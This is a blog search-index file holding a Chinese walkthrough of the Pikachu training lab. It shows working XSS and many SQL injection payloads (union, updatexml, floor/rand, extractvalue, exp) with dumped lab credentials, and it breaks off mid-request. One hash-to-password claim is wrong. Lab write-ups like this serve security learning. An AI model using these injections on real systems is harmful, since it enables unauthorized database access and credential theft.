<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pikachu靶场+分析</title>
    <link href="/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <url>/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><ol><li>反射性XSS</li><li>存储型XSS</li><li>DOM型XSS</li></ol><blockquote><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP  TOP10的排名中一直属于前三的江湖地位。</p><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p><p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“对输出进行转义”的方式进行处理。</p></blockquote><p>实验前先把项目里的pkxss拷贝放进搭建环境根目录（例如使用phpstudy，pkxss放进www文件）。</p><p>新开标签页，打开后台<a href="http://localhost/pkxss/pkxss_login.php%E3%80%82">http://localhost/pkxss/pkxss_login.php。</a></p><p>登陆后发现内含3个模块。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230402121825372.png" alt="image-20230402121825372" style="zoom:50%;" /><h2 id="1-反射型xss-get、post"><a href="#1-反射型xss-get、post" class="headerlink" title="1.反射型xss(get、post)"></a>1.反射型xss(get、post)</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328205420022.png" alt="image-20230328205420022" style="zoom:50%;" /><p>输入框输入名字。提交空，提示输入kobe。输入kebe显示图片，输入其他显示who is xxx。</p><p>尝试提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现输入长度做了限制。</p><p>直接F12修改maxlength属性。</p><p>重新输入payload，成功弹出1.</p><h2 id="2-存储型xss"><a href="#2-存储型xss" class="headerlink" title="2.存储型xss"></a>2.存储型xss</h2><h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><h2 id="1-数字型注入（post）"><a href="#1-数字型注入（post）" class="headerlink" title="1.数字型注入（post）"></a>1.数字型注入（post）</h2><p>这题是post类型（数据放在Request body中），数据需要使用bp进行抓取。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230325234741021.png" alt="image-20230325234741021"></p><p>可以选择id进行查询，通过试验，不同的id会导致回显的用户名及邮箱不同。</p><p>猜测通过id在数据库查找用户名。</p><p>bp抓包后测试<code>id=1 or 1 = 1</code>，结果显示出所有的用户名。</p><p>（解释，假设查询语句为<code>select username from member where id=_</code>,也就是通过id值进行查找，这时候如果将where的条件改为<code>id=1 or 1 = 1</code>，因为1&#x3D;1为真，这句话的效果就等同于<code>select username from member</code>）.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326000103330.png" alt="image-20230326000103330" style="zoom: 50%;" /><p>这个测试意味着输入没有做限制，可以进行注入。</p><p>此时可以使用联合查询获取信息。</p><p>联合查询必须拥有相同的列（否则会报错），所以需要使用<code>order by</code>来判断列数。</p><p><code>order by</code>可指定列进行排序，可通过指定的列是否存在来判断列的个数。</p><p>该例子里，当试验到<code>id=1 order by 3</code>时，页面回显报错。意味着列的个数为2。</p><p>通过列的格式来进行查询，例如：<code>id=1 union select 1,database()</code></p><p>回显出了数据库的名字（其他的信息也同理查询）。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326005545266.png" alt="image-20230326005545266" style="zoom:50%;" /><blockquote><p>mysql 5.0以上版本自带数据库，information_schema记录有当前mysql下所有数据库名，表名，列名信息。下列是存放各信息的名字</p><p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p></blockquote><p>一些查询语句（mysql5）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 数据库</span><br><span class="hljs-keyword">select</span> database()  <span class="hljs-comment">-- 获得数据库名pikachu</span><br><br><span class="hljs-comment">-- 表名</span><br><span class="hljs-comment">-- group_concat()，将多个字符串连在一起，这样可以使格式不出问题</span><br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(table_name)               <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> httpinfo,<span class="hljs-keyword">member</span>,message,users,xssblind <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><br><span class="hljs-comment">-- 列名（此处举例查users表）</span><br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(column_name)                                             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><br><span class="hljs-comment">-- 数据（此处举例查username,password[注意格式]）</span><br><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> pikachu  <span class="hljs-operator">|</span> <span class="hljs-number">670</span>b14728ad9902aecba32e22fa4f6bd <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> test     <span class="hljs-operator">|</span> e99a18c428cb38d5f260853678922e03 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br></code></pre></td></tr></table></figure><p>对md5进行解密（例如<a href="https://www.cmd5.com/">cmd5</a>），得到密码。</p><p>例如e10adc3949ba59abbe56e057f20f883e解密得到abc123.</p><h2 id="2-字符型注入（get）"><a href="#2-字符型注入（get）" class="headerlink" title="2.字符型注入（get）"></a>2.字符型注入（get）</h2><p>这题是get类型，参数通过url传递（关于post和get详解<a href="https://blog.csdn.net/guorui_java/article/details/112294323">见此</a>）。</p><p>其实总体流程和数字型差不多，只不过此处输入的数据类型为字符型。</p><p>字符需要用引号括起来。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326133757588.png" alt="image-20230326133757588"></p><p>输入aaa’进行测试，页面返回：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’aaa’’’  at line 1</p></blockquote><p>单引号改成双引号不会报错。</p><p>猜测内部的查询语句为：<code>select xxx from member where username = &#39;__&#39;;</code></p><p>搜索信息的语句和数字型的没太多区别。</p><p>例如查询全部信息，输入<code>a&#39; or 1=1#。</code></p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326134351926.png" alt="image-20230326134351926" style="zoom:50%;" /><p>最后加上的**#**是注释符，让后面的’失效。如果#无法生效，可以转换为url编码的<code>%23</code>。</p><p>除此之外，还有<code>--+</code>，其中<code>--</code>表示行注释，<code>+</code>表示空格，如果<code>--</code>直接和单引号连接在一起是错误的，中间需要空格语句才能生效。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 这是正确的注释</span><br><span class="hljs-comment">--这是错误的注释</span><br>#这也是单行注释<br><span class="hljs-comment">/*这是块注释*/</span><br></code></pre></td></tr></table></figure><p>例如查询pikachu库里的表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><blockquote><p>your uid:1<br>your email is: httpinfo,member,message,users,xssblind</p></blockquote><p>例如查询用户名密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select username,password from users#</span><br></code></pre></td></tr></table></figure><blockquote><p>your uid:admin<br>your email is: e10adc3949ba59abbe56e057f20f883e</p><p>your uid:pikachu<br>your email is: 670b14728ad9902aecba32e22fa4f6bd</p><p>your uid:test<br>your email is: e99a18c428cb38d5f260853678922e03</p></blockquote><h2 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326142139656.png" alt="image-20230326142139656" style="zoom:50%;" /><p>根据用户名的一部分进行搜索。</p><p>猜测是<code>select username,email from member where username like &#39;%_%&#39;;</code></p><p>测试<code>a%&#39; or 1=1#</code>，查询出所有结果。</p><p>测试<code>a%&#39; order by 4#</code>报错，见回显可知查询的列数为3.</p><h2 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h2><p>先弄清楚查询的格式。</p><p>输入<code>a&#39;</code>进行测试，回显如下：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’a’’)’ at line 1</p></blockquote><p>猜测是 <code>（&#39;查询内容&#39;) </code>这样的格式。</p><p>进行测试：<code>a&#39;) or 1=1 #</code>，显示出了所有的查询结果。</p><h2 id="5-insert-x2F-update-注入（报错注入）"><a href="#5-insert-x2F-update-注入（报错注入）" class="headerlink" title="5.insert&#x2F;update 注入（报错注入）"></a>5.insert&#x2F;update 注入（报错注入）</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326150806229.png" alt="image-20230326150806229" style="zoom:50%;" /><p>select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。</p><p>修改个人信息页面使用update更新数据，可使用。</p><p><strong>常见的几种报错注入函数：</strong></p><p>1.updatexml()</p><p>2.floor()</p><p>3.extractvalue()</p><p>4.exp()</p><h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml()"></a>1.updatexml()</h3><p>改变（查找并替换）XML文档中符合条件的节点的值。</p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string (Xpath格式的字符串) </p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>返回内容：若xpath正确则返回更改对象名称，否则返回xpath错误内容</p></blockquote><p>意味着updatexml的第一个参数和第三个参数都不重要，利用第二个参数即可。（<a href="http://c.biancheng.net/python_spider/xpath.html">xpath简单教程</a>）</p><p>例如，payload为<code>&#39; and updatexml(1,version(),3)#</code>。</p><p>回显为：<code>XPATH syntax error: &#39;.28&#39;</code></p><p>查看数据库得知version为5.7.28，发现报错显示不全。</p><p>测试<code>&#39; and updatexml(1,concat(0x7e,version()),3)#</code>，回显出<del>5.7.28.（ASCII里的0x7e就是</del>，而xpath中没有~，所以格式会报错）。</p><p>其他的信息查询也一样，只是格式改变。</p><p>例如查询表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; limit 0,1)),0)#</span><br><span class="hljs-string"></span><br><span class="hljs-string">-- 回显为 XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>httpinfo<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>要做查询的个数限制（limit 0,1)，否则会报错.</p><p>updatexml最多输出32个字节，超出的时候可以使用substring。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 前32位</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1), 0)),0)#</span><br><span class="hljs-string">-- 32位后</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-number">32</span>)),<span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure><p>可截取的函数：</p><ul><li>mid函数： 返回从指定位置开始的子字符串</li><li>substr函数：返回指定的子字符串</li><li>concat函数： 返回连接的字符串</li></ul><h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor()"></a>2.floor()</h3><p>floor()可实现向下取整。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span>           <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br></code></pre></td></tr></table></figure><p>rand()可以得到0和1之间的随机数。但如果传入参数，会返回的数字是固定的（伪随机）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand()              <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.09440490984768132</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.02</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> rand()             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.9136333120182467</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><br><span class="hljs-comment">-- 传入参数0</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>floor(rand()) 的结果为0.</p><p>floor(rand(0)*2)的结果是0或1，因为rand()返回的值在0和1之间，乘以2就是0和2之间，向下取反后结果是0或1。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><p>可见生成了固定的随机序列（01101）。</p><p>count()用于计数、group by可进行筛选分组。</p><p>使用count(*)和group by查询表，是先创建一个虚拟表，一条条读取原表，再填进虚拟表。读取到没有的就写入、有的就count+1.</p><p>可以让它们组合起来获取信息。</p><p>例如构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version()))<span class="hljs-keyword">as</span> test <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> test;<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1|5.7.28&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;&lt;group_key&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>版本信息被暴露在报错里。</p><p><strong>报错原理如下：</strong></p><p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version()))as test from users group by test;</code></p><p>等同于</p><p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version())) from users group by (floor(rand(0)*2),0x7c,(select version()))</code></p><p>首先会建立一个虚拟表。</p><p>然后执行第一个<code>floor(rand(0)*2)</code>，结果为0|5.7.28。group by会再执行一次（第二次调用），结果为1|5.7.28。</p><p>此时并没有1|5.7.28，所以插入该Key，count为1.</p><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>1|5.7.28</td><td>1</td></tr></tbody></table><p>因为<code>floor(rand(0)*2)</code>的结果数列为0、1、1、0、1</p><p>接着向下执行，第二次的结果（第三、第四次调用）分别为1|5.7.28和0|5.7.28。</p><p>此时key为1|5.7.28的count值加一。</p><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>1|5.7.28</td><td>2</td></tr></tbody></table><p>但key中没有0|5.7.28，所以加入新的key。</p><p>加入新的key，需要再一次调用floor(rand(0)*2)，也就是第五次调用，这时候的结果为1。</p><p>可是1|5.7.28已经存在了，再一次添加就会报错。</p><p>所以报错为<code>ERROR 1062 (23000): Duplicate entry &#39;1|5.7.28&#39; for key &#39;&lt;group_key&gt;&#39;</code>，意为添加了重复条目。</p><p>可以通过这个报错来获取我们需要的信息。</p><p><strong>注意：表中最少要3条数据，否则不会报错。</strong></p><h3 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3.extractvalue()"></a>3.extractvalue()</h3><blockquote><p>1.函数含义： 使用 XPath 表示法从 XML 字符串中提取值，即返回的是一个字符串。</p><p>2.用法</p><p>ExtractValue(xml_frag, xpath_expr)</p><p>两个字符串参数：</p><p>(1) xml_frag: XML 标记片段，xml语言的标签闭合内的值，</p><p>(2) xpath_expr: XPath 表达式，匹配xml标签内的值并返回。</p></blockquote><p>例如：<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))# </code></p><p>和updatexml用法类似。</p><h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp()"></a>4.exp()</h3><blockquote><p>EXP(number)</p><p>参数为次方值。</p><p><code>EXP()</code> 函数返回自然常数 <code>e</code> 的指定数值的次方。</p><p>如果参数 <code>number</code> 为 <code>NULL</code>，<code>EXP()</code> 函数将会返回 <code>NULL</code>。</p></blockquote><p>由于mysql记录的double数值有限，当exp的值大于709时，就会引起溢出错误。</p><p>pow()也是类似。</p><p><code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version());<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version())  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">18446744073709551610</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><br><span class="hljs-comment">-- 例如</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())x));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9849">详情见此</a></p><p>ps:MySQL&gt;5.5.53不可用。</p><h2 id="6-delete注入"><a href="#6-delete注入" class="headerlink" title="6.delete注入"></a>6.delete注入</h2><p>和insert&#x2F;update注入一样，使用报错注入。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013652464.png" alt="image-20230328013652464" style="zoom: 50%;" /><p>留言后删除，使用bp进行抓包，对id值进行修改。</p><p>此处payload为<code>1 or updatexml(1,concat(0x7e,database()),0)</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013814090.png" alt="image-20230328013814090"></p><p>将payload进行处理。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013904797.png" alt="image-20230328013904797" style="zoom:50%;" /><p>回显获得了数据库名：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013943409.png" alt="image-20230328013943409" style="zoom:33%;" /><h2 id="7-http-header-注入"><a href="#7-http-header-注入" class="headerlink" title="7.http header 注入"></a>7.http header 注入</h2><p>和insert&#x2F;update 注入页面类似的登录页面，输入用户名密码即可登录。</p><p>登录后回显出一些信息：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328104838427.png" alt="image-20230328104838427" style="zoom:50%;" /><p>注入就从回显的信息入手，回显的信息都是http报文的内容。</p><h3 id="HTTP报文分析"><a href="#HTTP报文分析" class="headerlink" title="HTTP报文分析"></a>HTTP报文分析</h3><p>http报文由<strong>三部分</strong>组成：<strong>状态行（请求行&#x2F;相应行）、首部、主体</strong></p><p>http报文可以分为<strong>请求报文</strong>和<strong>响应报文</strong>（客户端发送请求，服务器响应请求）。</p><p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105626168.png" alt="《图解http》-请求报文" style="zoom:33%;" /><p>响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代 码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105909551.png" alt="《图解http》-响应报文" style="zoom: 33%;" /><p>http头注入的<strong>产生原因</strong>：没有对http头中的User-agent、Referer、Cookie等进行过滤。</p><p>以下为案例请求包（不要抓错）：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pikachu/vul/sqli/sqli_header/sqli_header.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br>User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0<br><span class="hljs-attribute">Accept</span><span 